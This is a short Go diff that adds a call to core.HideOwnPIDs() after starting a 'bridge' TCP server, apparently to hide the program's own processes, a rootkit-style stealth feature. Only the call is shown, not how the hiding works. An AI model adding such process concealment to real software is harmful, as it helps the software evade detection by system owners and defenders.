@@ -82,5 +82,12 @@ func main() {
 		}
 		bridge.SetupTCPServer()
 	}()
+
+	enter, exit, err := core.HideOwnPIDs()
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer core.CloseLinks(enter, exit)
+
 	<-c
 }
